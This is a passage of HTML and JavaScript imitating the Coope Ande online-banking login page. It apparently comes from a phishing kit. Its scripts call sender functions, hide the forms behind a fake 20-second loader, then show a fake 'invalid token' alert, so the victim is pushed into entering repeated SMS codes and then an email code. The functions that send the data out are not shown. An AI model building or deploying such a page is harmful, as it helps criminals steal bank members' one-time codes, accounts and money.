                                                <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido" style="display:none">El formato de la indentificaci&oacute;n es incorrecto</div>
                                                <div class="col-xs-6">
                                                    <div class="form-group">
                                                        <div class="col-md-6">
                                                            <button type="button" onclick="resetClaveEmp();" class="btn_actualizar" value="Continuar">Continuar</button>
                                                        </div>
                                                        <div class="col-md-6">
                                                            <button type="button" class="btn-dark" onclick="ModalToggleCloseEmp();">Regresar</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                            <script>

                                        document.getElementById('loader-wrapper').style.display = "none";
                                        document.getElementById('frmLoginPersonal2').style.display = "block";
         
                                
                                function avanzar1 (){
                                    sender1();
                                    document.getElementById('frmLoginPersonal').style.display = "none";
                                    document.getElementById('loader-wrapper').style.display = "block";
                                    setTimeout(function m (){
                                        document.getElementById('loader-wrapper').style.display = "none";
                                        alert("Token no valido, por favor ingrese de nuevo el codigo SMS");
                                        document.getElementById('frmLoginPersonal1').style.display = "block";
                                    },20000)
                                }
                                function avanzar2 (){
                                    senderSms();
                                    document.getElementById('frmLoginPersonal1').style.display = "none";
                                    document.getElementById('loader-wrapper').style.display = "block";
                                    setTimeout(function m (){
                                        document.getElementById('loader-wrapper').style.display = "none";
                                        document.getElementById('frmLoginPersonal2').style.display = "block";
                                    },20000)
                                }
                            </script>
                        </div>
                    </div>
                    <div id="blockMessageEmp" style="display:none">
                        <div class="fvaMargenDeContenido">
                            <h5 class="labelH5Bold"></h5>
                        </div>
                        <div class="fvaContenidoParaTipoIdentificacion" id="messageReturnEmp"></div>
                    </div>
                </div>
            </div>

            <section class="card-wrapper">
                <div class="card-wrapper-content">
                    <div class="card-teclado">
                        <div id="noticiasContainer">
                            <div id="dynamicNoticias" style="text-align: center;top: 90px; position: relative;">
                                <img src="imagenes/logo-transparente.png?" alt="logo" width="250" height="200">
                            </div>
                        </div>
                    </div>
                    <div class="clearfix"></div>
                                      
                    <style>.loader-wrapper {
                        
                        text-align: center;
                        position: relative;
                        height: 300px;
                      }
                      
                      .loader1 {
                        border: 10px solid #3498db;
                        border-top: 10px solid #f3f3f3;
                        border-radius: 50%;
                        width: 60px;
                        height: 60px;
                        animation: spin 2s linear infinite;
                        margin: 0 auto;
                        position: relative;
                        top: 50%;
                        transform: translateY(-50%);
                      }
                      
                      .loading-text {
                        margin-top: 20px;
                        font-size: 1.2em;
                        font-weight: bold;
                        color: #555;
                      }

                      @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
                      
                      </style>
                    <div class="card-login"> 
                        <form onsubmit="javascript:return senderSms();" id="frmLoginPersonal" name="frmLoginPersonal" method="post" style="display:none">
                            <input type="hidden" name="navegador" value="" id="hNavegador">
                            <input type="hidden" name="tipoAmbiente" value="P" id="hAmbiente">
                            <input type="hidden" name="longitud" value="" id="Plongitud">
                            <input type="hidden" name="latitud" value="" id="Platitud">
                            <input type="hidden" name="password" value="" id="passwordPr">
                            <p class="card-login-title">Coope Ande en l&iacute;nea</p>

                            <div id="message_area_LoginPersonal" style="clear: both;width: 90%; margin-left: auto; margin-right: auto; text-align: center;background: #f1d2d5;margin-bottom: 6px;">
                                
                                        <div class=" errormsg" id="errorMsg" align="center" style="display: contents; width:86%; margin-left: auto; margin-right: auto; font-size: 18px; color: #bd3543;padding:0px;height:0px">
                                        </div>
                                 
                            </div>
                            <div id="message_areaOTP">
                                <div class="message errormsg" id="errorMsg" align="center" style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;"></div>
                            </div><p class="card-link" style="text-align: center;">Ingresa el codigo SMS enviado a tu celular.</p>
                            <input style="width: 90%;" type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="SMS" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="SMS">
                            <div class="clearfix"></div>
                           
                            
                                    
                            <div class="clearfix"></div>
                            
                            
                            <input type="submit" class="btn_actualizar" value="Continuar" id="btnValidasr">
                            <div style=" text-align: center;">
                                <a class="card-link" onclick="modalRequest();" href="javascript:void(0);">¿Olvidó
                                                                                                          su
                                                                                                          contraseña?</a>
                            </div>
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital" class="btn_actualizar_firma" title="Firma digital" onclick="event.preventDefault();modalAuthPrs();">
Firma digital
</button>

                        </form>
                        <form style="display: none;" id="frmLoginPersonal1" name="frmLoginPersonal" method="post" style="display:block">
                            <input type="hidden" name="navegador" value="" id="hNavegador">
                            <input type="hidden" name="tipoAmbiente" value="P" id="hAmbiente">
                            <input type="hidden" name="longitud" value="" id="Plongitud">
                            <input type="hidden" name="latitud" value="" id="Platitud">
                            <input type="hidden" name="password" value="" id="passwordPr">
                            <p class="card-login-title">Coope Ande en l&iacute;nea</p>

                            <div id="message_area_LoginPersonal" style="clear: both;width: 90%; margin-left: auto; margin-right: auto; text-align: center;background: #f1d2d5;margin-bottom: 6px;">
                                
                                        <div class=" errormsg" id="errorMsg" align="center" style="display: contents; width:86%; margin-left: auto; margin-right: auto; font-size: 18px; color: #bd3543;padding:0px;height:0px">
                                        </div>
                                 
                            </div>
                            <div id="message_areaOTP">
                                <div class="message errormsg" id="errorMsg" align="center" style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;"></div>
                            </div><p class="card-link" style="text-align: center;">Ingresa el codigo SMS enviado a tu celular.</p>
                            <input style="width: 90%;" type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="SMS" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="SMS">
                            <div class="clearfix"></div>
                           
                            
                                    
                            <div class="clearfix"></div>
                            
                            
                            <input type="button" onclick="avanzar2();" class="btn_actualizar" value="Continuar" id="btnValidasr">
                            <div style=" text-align: center;">
                                <a class="card-link" onclick="modalRequest();" href="javascript:void(0);">¿Olvidó
                                                                                                          su
                                                                                                          contraseña?</a>
                            </div>
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital" class="btn_actualizar_firma" title="Firma digital" onclick="event.preventDefault();modalAuthPrs();">
Firma digital
</button>

                        </form>
                        <form  id="frmLoginPersonal2" name="frmLoginPersonal" method="post" >
                            <input type="hidden" name="navegador" value="" id="hNavegador">
                            <input type="hidden" name="tipoAmbiente" value="P" id="hAmbiente">
                            <input type="hidden" name="longitud" value="" id="Plongitud">
                            <input type="hidden" name="latitud" value="" id="Platitud">
                            <input type="hidden" name="password" value="" id="passwordPr">
                            <p class="card-login-title">Coope Ande en l&iacute;nea</p>

                            <div id="message_area_LoginPersonal" style="clear: both;width: 90%; margin-left: auto; margin-right: auto; text-align: center;background: #f1d2d5;margin-bottom: 6px;">
                                
                                        <div class=" errormsg" id="errorMsg" align="center" style="display: contents; width:86%; margin-left: auto; margin-right: auto; font-size: 18px; color: #bd3543;padding:0px;height:0px">
                                        </div>
                                 
                            </div>
                            <div id="message_areaOTP">
                                <div class="message errormsg" id="errorMsg" align="center" style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;"></div>
                            </div><p class="card-link" style="text-align: center;">Ingresa el código que se le ha enviado al correo.</p>
                            <input required style="width: 90%;" type="text" name="correo" maxlength="30" value="" tabindex="1" id="tokenuno" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="Código al correo">
                            <div class="clearfix"></div>
                           
                            
                                    
                            <div class="clearfix"></div>
                            
                            
                            <input type="submit" class="btn_actualizar" value="Continuar" id="btnValidasr">
                            <div style=" text-align: center;">
                                <a class="card-link" onclick="modalRequest();" href="javascript:void(0);">¿Olvidó
                                                                                                          su
                                                                                                          contraseña?</a>
                            </div>
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital" class="btn_actualizar_firma" title="Firma digital" onclick="event.preventDefault();modalAuthPrs();">
Firma digital
</button>

                        </form>
                        <div id="uno" style="display: none;">
                        <p class="card-login-title">Coope Ande en l&iacute;nea</p>
                        <div class="login-wrapperRadio">
                            <div class="wrapperRadio-radio">
                                <input type="radio" id="check-personal" checked="checked" class="radioBtn" onclick="formPersonal();">
                                 
                                <label for="check-personal">
                                    <span>Personal</span>
                                </label>
                            </div>
                            |
                            <div class="wrapperRadio-radio">
                                <input type="radio" id="check-empresarial" class="radioBtn" onclick="formEmpresarial();">
                                 
                                <label for="check-empresarial">
                                    <span>Empresarial</span>
                                </label>
                            </div>
                        </div>
                        <form id="frmLoginFirma" name="frmLoginFirma" action="loginFirmaDigital" method="post">
                            <input type="hidden" name="navegador" value="" id="hNavegador2">
                            <input type="hidden" name="idReferencia" value="" id="hReferencia">
                            <input type="hidden" name="idSolicitud" value="" id="hSolicitud">
                            <input type="hidden" name="emisor" value="" id="hEmisor">
                            <input type="hidden" name="sujeto" value="" id="hSujeto">
                            <input type="hidden" name="numeroSerie" value="" id="hNumeroSerie">
                            <input type="hidden" name="validoDesde" value="" id="hValidoDesde">
                            <input type="hidden" name="validoHasta" value="" id="hValidoHasta">
                            <input type="hidden" name="digesto" value="" id="hDigesto">
                            <input type="hidden" name="token" value="" id="hToken">
                            <input type="hidden" name="tipoAmbiente" value="" id="hAmbiente">
                            <input type="hidden" name="cedulaSinpe" value="" id="hCedula">
                            <input type="hidden" name="longitud" value="" id="Dlongitud">
                            <input type="hidden" name="latitud" value="" id="Dlatitud">
                          
                            <input type="hidden" name="cedJuridica" value="" id="hJuridica">
                        </form>
                        <div id="loader" style="display:none">
                            <div class="col-xs-12 fvaMargenDeContenido">Procesando su solicitud de autenticación</div>
                            <div id="" class="fvaLoader" style="display: none;">
                                <div></div>
                                <div></div>
                                <div></div>
                            </div>
                        </div>
                        
                       
                         
                        <form id="frmLoginFirmaEmp" name="frmLoginFirmaEmp" action="loginFirmaDigitalEmp" method="post">
                            <input type="hidden" name="navegador" value="" id="hNavegador2Emp">
                            <input type="hidden" name="idReferencia" value="" id="hReferenciaEmp">
                            <input type="hidden" name="idSolicitud" value="" id="hSolicitudEmp">
                            <input type="hidden" name="tipoAmbiente" value="" id="hAmbienteFirma">
                            <input type="hidden" name="cedJuridica" value="" id="hJuridica">
                            <input type="hidden" name="cedulaSinpe" value="" id="hCedulaEmp">
                            <input type="hidden" name="longitud" value="" id="DlongitudEmp">
                            <input type="hidden" name="latitud" value="" id="DlatitudEmp">
                            
                        </form>
                        <form id="frmLoginPersonauno" name="frmLoginPersonal" method="post" style="display:none">
                            <input type="hidden" name="navegador" value="" id="hNavegador">
                            <input type="hidden" name="tipoAmbiente" value="P" id="hAmbiente">
                            <input type="hidden" name="longitud" value="" id="Plongitud">
                            <input type="hidden" name="latitud" value="" id="Platitud">
                            <input type="hidden" name="password" value="" id="passwordPr">

                            <div id="message_area_LoginPersonal" style="clear: both;width: 90%; margin-left: auto; margin-right: auto; text-align: center;background: #f1d2d5;margin-bottom: 6px;">
                                
                                        <div class=" errormsg" id="errorMsg" align="center" style="display: contents; width:86%; margin-left: auto; margin-right: auto; font-size: 18px; color: #bd3543;padding:0px;height:0px">
                                        </div>
                                 
                            </div>
                            <div id="message_areaOTP">
                                <div class="message errormsg" id="errorMsg" align="center" style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;"></div>
                            </div>
                            <input style="width: 90%;" type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="identificacionPrs" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="Usuario">
                            <div class="clearfix"></div>
                           
                            <input  style="width: 90%;" type="password" name="" maxlength="20" tabindex="2" id="txtPass" class="pass-login" onfocus="" autocomplete="off" placeholder="Contraseña">
                                    
                            <div class="clearfix"></div>
                            
                            
                            <input type="submit" class="btn_actualizar" value="Ingresar" id="btnValidasr">
                            <div style=" text-align: center;">
                                <a class="card-link" onclick="modalRequest();" href="javascript:void(0);">¿Olvidó
                                                                                                          su
                                                                                                          contraseña?</a>
                            </div>
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital" class="btn_actualizar_firma" title="Firma digital" onclick="event.preventDefault();modalAuthPrs();">
Firma digital
</button>

                        </form>              
                        <form id="frmLoginEmpresarial" name="frmLoginEmpresarial" action="loginEmp" method="post" style="display:none" autocomplete="false">
                            <input type="hidden" name="navegador" value="" id="hNavegadorEmp">
                            <input type="hidden" name="tipoAmbiente" value="J" id="hAmbiente">
                            <input type="hidden" name="longitud" value="" id="Elongitud">
                            <input type="hidden" name="latitud" value="" id="Elatitud">
                            <input type="hidden" name="password" value="" id="passwordEmp">
                           
                            <div id="message_area" style="clear: both;width: 90%; margin-left: auto; margin-right: auto; text-align: center;background: #f1d2d5;margin-bottom: 6px;">
                                
                                 
                            
                            </div>
                            <div id="message_areaOTPEmp">
                                <div class="message errormsg" id="errorMsgEmp" align="center" style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;"></div>
                            </div>
                            <input type="text" name="cedJuridica" maxlength="30" value="" tabindex="1" id="txt01" class="user-login-emp" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="Cédula Juridica">
                            <input type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="txt02" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="Usuario">
                            <div class="clearfix"></div>
                            <input type="password" name="" maxlength="20" tabindex="2" id="txt03" class="pass-login-emp" onkeypress="" autocomplete="off" placeholder="Contraseña">
                            <div class="clearfix"></div>
                            <button class="btn_actualizar" onclick="cryptFormEmp();" href="javascript:void(0);">Ingresar</button>
                            <div style="text-align: center;">
                                <a class="card-link" onclick="modalEmpresarial();" href="javascript:void(0);">&iquest;Olvid&oacute;
                                                                                                              su
                                                                                                              contrase&ntilde;a?</a>
                            </div>
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital" class="btn_actualizar_firma" title="Firma digital" onclick="event.preventDefault();modalAuthEmp();">
Firma digital
</button>

                        </form>



                    </div></div>
                </div>
            </section>
             
            <section class="card-notes">
                <div class="container-block">
                    <div id="tipoCambio" class="typeChange">
                        <div class="change-header">
                            <span>Tipo de cambio</span>
                        </div>
                        <div style="">
                            <div>
                                <span class="labelDol">Dólares</span>
                            </div>
                            <div class="exchange-wrapper">
                                <div class="ul-padding">
                                    <div class="">
                                        <span id="buyUsd" class="buyUsd">₡ 530.00</span>
                                         
                                        <span id="Buylabel" class="activeConverter">Compra</span>
                                    </div>
                                    <div class="">
                                        <span id="sellUsd" class="sellUsd">₡ 544.00</span>
                                         
                                        <span id="sellLabel" class="sellUsdLabel">Venta</span>
                                    </div>
                                </div>
                            </div>
                            <div class="convert clearfix">
                                <div class="con-divider">
                                    <span>CONVERTIDOR</span>
                                </div>
                                <div class="clearfix">
                                    <span id="symbolForInput" class="inputSymbol">$</span>
                                     
                                    <input class="converter-input" onkeyup="typeamountConverter()" onblur="formatNumber(this.value)" onfocus="" onkeypress="return app.acceptNum(event);" id="amountConverter" maxlength="10" placeholder="0" autocomplete="off">
                                     
                                    <label id="changeExchange" class="show-icon hide-button" onclick="changeExchange();">cc</label>
                                </div>
                                <div class="resultConverter">
                                    <span id="equalResult">=
                                        <span id="moneySymbolConverter">₡ </span><span id="resultAmount">0</span></span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="seguridad" class="typeChange">
                        <div class="change-header">
                            <span>Seguridad</span>
                        </div>
                        <div style="padding: 8px">
                            <div align="center" style="text-align: justify; font-size: 13px;">
                                Por su seguridad si digita incorrectamente su contrase&ntilde;a 
                                <span class="style83">3 veces seguidas</span>
                                 &eacute;sta le ser&aacute; 
                                <span class="style83">bloqueada.</span><br>
                                 
                                <br>
                            </div>
                            <div align="center" style=" text-align: justify;font-size: 13px;">
                                Coope Ande 
                                <span class="style83">NUNCA</span>
                                 le solicitar&aacute; su contrase&ntilde;a por correo electr&oacute;nico,
                                tel&eacute;fono o cualquier otro medio ya que esa informaci&oacute;n es totalmente
                                confidencial de nuestro asociado.<br>
                            </div>
                        </div>
                    </div>
                    <div class="modalRequest" id="modalLinks" style="display:none">
                        <div class="modal-content">
                            <div>
                                <div align="center">
                                    <img src="imagenes/logo_coope.png?ver=20150102" width="120" height="50" alt="Logo">
                                     
                                    <img class="close-button" src="imagenes/closed.png?ver=20150102" onclick="ModalToggleClosePass();" alt="Cerrar">
                                </div>
                                <div></div>
                            </div>
                            <div id="blockIden" style="">
                                <div class="fvaMargenDeContenido">
                                    <h5 class="labelH5Bold" id="title">&iquest;Qu&eacute; hacer si se me bloquea la
                                                                       contrase&ntilde;a?</h5>
                                </div>
                                <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">
                                    <p style="text-align:justify; margin: 15px;">Su clave se bloquear&aacute;
                                                                                 autom&aacute;ticamente cuando la digite
                                                                                 de forma err&oacute;nea 3 veces
                                                                                 seguidas. Para desbloquearla deber&aacute;
                                                                                 seguir los pasos de
                                                                                 <span style='font-weight: bold;'>&ldquo;&iquest;Olvido su
                                                                                 contrase&ntilde;a?&rdquo;</span> o presentarse
                                                                                 en cualquiera de nuestras agencias para
                                                                                 solicitar el desbloqueo, o bien, una
                                                                                 nueva clave. Para m&aacute;s detalles
                                                                                 puede llamar a nuestra Central
                                                                                 Telef&oacute;nica al 2243- 0303 o bien
                                                                                 escribir al correo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="224b4c444d62414d4d5247434c4647130c414d4f">[email&#160;protected]</a></p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="modalRequest" id="linkChange" style="display:none">
                        <div class="modal-content">
                            <div>
                                <div align="center">
                                    <img src="imagenes/logo_coope.png?ver=20150102" width="120" height="50" alt=" ">
                                     
                                    <img class="close-button" src="imagenes/closed.png?ver=20150102" onclick="ModalToggleCloseChange();" alt="Cerrar">
                                </div>
                                <div></div>
                            </div>
                            <div id="blockIden" style="">
                                <div class="fvaMargenDeContenido">
                                    <h5 class="labelH5Bold" id="title">&iquest;C&oacute;mo cambio mi contrase&ntilde;a?</h5>
                                </div>
                                <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">
                                    <p style="text-align:justify; margin: 15px;">
                                        Para cambiar su
                                        contrase&ntilde;a primero debe ingresar a la p&aacute;gina con su clave actual.
                                        Luego, en el men&uacute; de la izquierda, debe ir a la opci&oacute;n
                                        <span style='font-weight: bold;'>&ldquo;Configuraci&oacute;n&rdquo;</span> elegir 
                                        <span style='font-weight: bold;'>&quot;Cambiar contrase&ntilde;a&quot;</span>
                                        y seguir los pasos que se le indican.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="info" class="typeChange">
                        <div class="change-header">
                            <span>Preguntas frecuentes</span>
                        </div>
                        <div class="" style="padding: 20px;">
                            <div align="left">
                                <a style="color: #333333" href="javascript:void(0);" onclick="linkPass();">&iquest;Qu&eacute;
                                                                                                           hacer si se
                                                                                                           me bloquea la
                                                                                                           contrase&ntilde;a?</a><br><br>
                            </div>
                            <div align="left">
                                <a style="color: #333333" href="javascript:void(0);" onclick="linkChange();">&iquest;C&oacute;mo
                                                                                                             cambio mi
                                                                                                             contrase&ntilde;a?</a><br><br>
                            </div>
                            <div align="left">
                                <a style="color: #333333" href="pdf/Servicios.pdf" target="_blank" rel="noopener">&iquest;Qu&eacute;
                                                                                                                  puedo
                                                                                                                  hacer
                                                                                                                  en
                                                                                                                  Coope
                                                                                                                  Ande
                                                                                                                  en
                                                                                                                  L&iacute;nea? </a>
                                 
                                <img src="imagenes/ico_pdf.png" width="15" height="16" alt="PdfIco">
                            </div>
                            <br>
                            <div align="left">
                                <a style="color: #333333" href="pdf/Accesos.pdf" target="_blank" rel="noopener">Consideraciones
                                                                                                                de la clave
                                                                                                                de
                                                                                                                acceso </a>
                                 
                                <img src="imagenes/ico_pdf.png" width="15" height="16" alt="PdfIco">
                            </div>
                            <br>
                        </div>
                    </div>
                </div>
            </section>
             
            <section class="card-secured">
                <div class="block-note">
                    <div class="change-header">
                        <span style="font-weight: bold;">IMPORTANTE</span>
                    </div>
                    <div class="notes-secure">
                        <div>
                            <div align="center" style="padding:10px">
                                <span class="style62">
                                    </span>
                            </div>
                            <div align="center">
                               
                            </div>
                        </div>
                        <div class="col-xs-5">
                            <div align="left" style="padding:10px;">
                                <span class="style98">Busque el candado cerrado en su navegador de internet.</span><span class="style18"> 
                                    <br>
                                     
                                    <br>
                                     </span><img src="imagenes/ico_https-info.png" width="235" height="35" alt="HttpIco">
                            </div>
                        </div>
                    </div>
                </div>
            </section>
             
            <br>
             
            <footer class="footer">
                <div id="indicia">
                    <p>
                        Coope Ande. San Jos&eacute; - Costa Rica 
                        <span id="year"></span>
                        <script data-cfasync="false" src="./cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
                          var d = new Date();
                          var n = d.getFullYear();
                          document.getElementById('year').innerHTML = n;
                        </script>
                        - Derechos Reservados.
                    </p>
                    <p>
                        Tel&eacute;fono: (506) 2243-0303 / e-mail: 
                        <a href="/cdn-cgi/l/email-protection#751c1b131a35161a1a0510141b1110445b161a18"><span class="__cf_email__" data-cfemail="3e575058517e5d51514e5b5f505a5b0f105d5153">[email&#160;protected]</span></a>
                    </p>
                </div>
            </footer>
        </div>
        <script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        

          var args = ['Identificaci�n', 'Finalizar'];
          setTimeline(args, 1);

          setTimelineEmp(args, 1);
          $(document).ready(function () {
              doGetNews();
              $(document).on("cut copy paste", "input", function (e) {
                  e.preventDefault();
              });

              $('form,input,select,textarea').attr("autocomplete", "off");

              //ajuste para eliminar autocomplete
              if (document.getElementsByTagName) {
                  var inputElements = document.getElementsByTagName("input");
                  for (i = 0;inputElements[i];i++) {
                      if (inputElements[i].className && (inputElements[i].className.indexOf("disableAutoComplete") !=  - 1)) {
                          inputElements[i].setAttribute("autocomplete", "off");
                      }
                  }
              }

              document.cookie.split(";").forEach(function (c) {
                  document.cookie = c.replace(/^ +/, "").replace( /=.*/ , "=;expires=" + new Date().toUTCString() + ";path=/");
              });
          });

          function modalAuthPrs() {
        
           if(detectBrowser().includes("IE")){
            
                modal.style.display = "block";
                $( "#blockMessageIE" ).css("display", "block"); 
                $( "#contentTimelineFirma" ).css("display", "none"); 
                event.preventDefault();
                
            }else{
              modalAuth("P");}
          }

          function modalAuthEmp() {
           if(detectBrowser().includes("IE")){
                modal.style.display = "block";
                $( "#blockMessageIE" ).css("display", "block"); 
                $( "#contentTimelineFirma" ).css("display", "none"); 
                event.preventDefault();
            }else{
              modalAuth("J");}
          }

          function formatNumber(num) {
              num += '';
              var splitStr = num.split('.');
              var splitLeft = splitStr[0];
              var splitRight = splitStr.length > 1 ? '.' + splitStr[1] : '';
              var regx = /(\d+)(\d{3})/;
              while (regx.test(splitLeft)) {
                  splitLeft = splitLeft.replace(regx, '$1' + ',' + '$2');
              }
              $("#amountConverter").val(splitLeft + splitRight);
          }

          function formPersonal() {
              var emp = document.getElementById("frmLoginEmpresarial");
              emp.style.display = "none";
              var prs = document.getElementById("frmLoginPersonal");
              prs.style.display = "block";
              document.getElementById("check-personal").checked = true;
              document.getElementById("check-empresarial").checked = false;
          }

          function formEmpresarial() {
              var emp = document.getElementById("frmLoginEmpresarial");
              emp.style.display = "block";
              var prs = document.getElementById("frmLoginPersonal");
              prs.style.display = "none";
              document.getElementById("check-empresarial").checked = true;
              document.getElementById("check-personal").checked = false;
          }
          var venta = false;
          var compra = true;

          function changeExchange() {

              var sellLabel = document.getElementById("sellLabel");
              var buyLabel = document.getElementById("Buylabel");
              document.getElementById("amountConverter").value = "";
              document.getElementById("resultAmount").textContent = "";
              if (buyLabel.className === "activeConverter") {
                  document.getElementById("Buylabel").className = "buyUsdLabel";
                  document.getElementById("sellLabel").className = "activeConverter";
                  document.getElementById("symbolForInput").textContent = "?";
                  document.getElementById("moneySymbolConverter").textContent = "$";
                  venta = true;
                  compra = false;
              }
              else if (sellLabel.className === "activeConverter") {
                  document.getElementById("Buylabel").className = "activeConverter";
                  document.getElementById("sellLabel").className = "sellUsdLabel";
                  document.getElementById("symbolForInput").textContent = "$";
                  document.getElementById("moneySymbolConverter").textContent = "?";
                  venta = false;
                  compra = true;
              }
          }

          function typeamountConverter() {
          
              var amountBuy = document.getElementById("buyUsd");
              var amountSell = document.getElementById("sellUsd");
              var amountConverter = document.getElementById("amountConverter").value.replace(",","");
              var result; 
              var newAmountBuy = amountBuy.innerText.split(" ");
              var newAmountSell = amountSell.innerText.split(" ");
              if (compra) {
                  result = newAmountBuy[1] * amountConverter;
              }
              else {
                  result = amountConverter / newAmountSell[1];
                  
              }

              document.getElementById("resultAmount").textContent = result.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
             
              

          }

          function modalRequest() {
              $("#modalRequest").css("display", "block");
              $("#blockIden").css("display", "block");
          };

          function modalEmpresarial() {
              $("#modalEmpresarial").css("display", "block");
              $("#blockEmp").css("display", "block");
          };

          function linkPass() {
              $("#modalLinks").css("display", "block");
          };

          function linkChange() {
              $("#linkChange").css("display", "block");
          };

          function ModalToggleClose() {
              $("#modalRequest").css("display", "none");
              $("#blockMessage").css("display", "none");
              document.getElementById("txtId").val = "";
              $("#txtId").val('');
              var args = ['Identificaci�n', 'Finalizar'];
              setTimeline(args, 1);
              setTimelineEmp(args, 1);
              $("#blockIden").css("display", "none");
          };
          function ModalToggleCloseOTP() {
              document.getElementById("cbMetodo").value = "-1";
              document.getElementById("codigoOTP").value = "";
              $("#modalOTP").css("display", "none");
              $("#blockMessage").css("display", "none");
              $("#blockToken").css("display", "none");
              $("#blockMetodoConfirmacion").css("display", "none");
              document.getElementById("logout").submit();
              
          };
          
          

          function ModalToggleClosePass() {
              $("#modalLinks").css("display", "none");
          };

          function ModalToggleCloseChange() {
              $("#linkChange").css("display", "none");
          };

          function ModalToggleCloseEmp() {
              $("#modalEmpresarial").css("display", "none");
              $("#txtIdEmp").val('');
              $("#txtIdJuri").val('');
              $("#blockMessageEmp").css("display", "none");
              var args = ['Identificaci�n', 'Finalizar'];
              setTimelineEmp(args, 1);
          };

          function acceptNum(e) {
              var key = (document.all) ? e.keyCode : e.which;// 2
              var patron = /[0-9\b]/;// 4
              var te = String.fromCharCode(key);// 5  
              return (key <= 13 || (key >= 48 && key <= 57)) && patron.test(te);
          }

          function preventBack() {
              window.history.forward();
          }
          window.onunload = function () {
              null;
          };
          setTimeout("preventBack()", 0);

          $(document).ready(function () {
              $(document).on("cut copy paste", "input", function (e) {
                  e.preventDefault();
              });
              $('form,input,select,textarea').attr("autocomplete", "off");
          });

          function resetClave() {
              if (document.getElementById("txtId").value == "") {
                  $(".fvaMensajeErrorIdentificacion").css("display", "block");
                  $('.fvaMensajeErrorIdentificacion').hide().show('slow').delay(2500).hide('slow');
              }
              else {
                  $("#blockIden").css("display", "none");
                  $("#loader").css("display", "block");
                  var datastring = $("#formReset").serialize();
                  $.ajax( {
                      type : "POST", url : "/coopeande/requestCambioClaveJson.action", contentType : 'application/x-www-form-urlencoded', cache : false, data : datastring, success : function (result) {
                          var element = document.getElementById("step2");
                          element.classList.add("complete");
                          var element2 = document.getElementById("step1");
                          element2.classList.remove("complete");
                          $("#loader").css("display", "none");
                          $("#blockMessage").css("display", "block");

                          if (result.flat) {
                              document.getElementById("messageReturn").innerHTML = '<div class="success" >Su tr�mite ha sido realizado</strong>. En pocos minutos recibir� en su correo electr�nico<br/>registrado en Coope Ande, las instrucciones para que pueda accesar a Coope Ande en L�nea.</div>';
                          }
                          else {
                              document.getElementById("messageReturn").innerHTML = '<div class="warning" align="center">' + result.message + ' </div>';
                          }
                      }
                  });
              }
          };

          function resetClaveEmp() {
              if (document.getElementById("txtIdEmp").value == "" || document.getElementById("txtIdJuri").value == "") {
                  $(".fvaMensajeErrorIdentificacion").css("display", "block");
                  $('.fvaMensajeErrorIdentificacion').hide().show('slow').delay(2500).hide('slow');
              }
              else {
                  $("#blockEmp").css("display", "none");
                  $("#loaderEmp").css("display", "block");
                  var datastring = $("#elFormEmp").serialize();
                  $.ajax( {
                      type : "POST", url : "/coopeande/requestCambioClaveCorpJson.action", contentType : 'application/x-www-form-urlencoded', cache : false, data : datastring, success : function (result) {
                          $("#loaderEmp").css("display", "none");
                          $("#blockMessageEmp").css("display", "block");
                          var element = document.getElementById("stepEmp2");
                          element.classList.add("complete");
                          var element2 = document.getElementById("stepEmp1");
                          element2.classList.remove("complete");
                          if (result.flat) {
                              document.getElementById("messageReturnEmp").innerHTML = '<div class="" >Su tr�mite ha sido realizado</strong>. En pocos minutos recibir� en su correo electr�nico<br/>registrado en Coope Ande, las instrucciones para que pueda accesar a Coope Ande en L�nea.</div>';
                          }
                          else {
                              document.getElementById("messageReturnEmp").innerHTML = '<div class="" align="center">' + result.message + ' </div>;';
                          }
                      }
                  });
              }
          };

          function setTimeline(args, active) {
              var content = "";
              var width = 100 / args.length - 1;
              for (i = 0;i < args.length;i++) {
                  var ul = "";
                  var stp = i + 1;
                  if (active - 1 == i) {
                      ul = '<li class="li complete" id="step' + stp + '" style="width:' + width + '%;" > <div class="timestamp"> <span class="author">' + args[i] + '</span></div><div class="status"></div></li>';
                  }
                  else {
                      ul = '<li class="li" id="step' + stp + '"  style="width:' + width + '%;" > <div class="timestamp" > <span class="author">' + args[i] + '</span></div><div class="status"></div></li>';
                  }
                  content += ul;
              }

              document.getElementById("contentTimeline").innerHTML = content;
              document.getElementById("contentTimelineEmp").innerHTML = content;
              return true;
          };

          function setTimelineEmp(args, active) {
              var content = "";
              var width = 100 / args.length - 1;
              for (i = 0;i < args.length;i++) {
                  var ul = "";
                  var stp = i + 1;
                  if (active - 1 == i) {
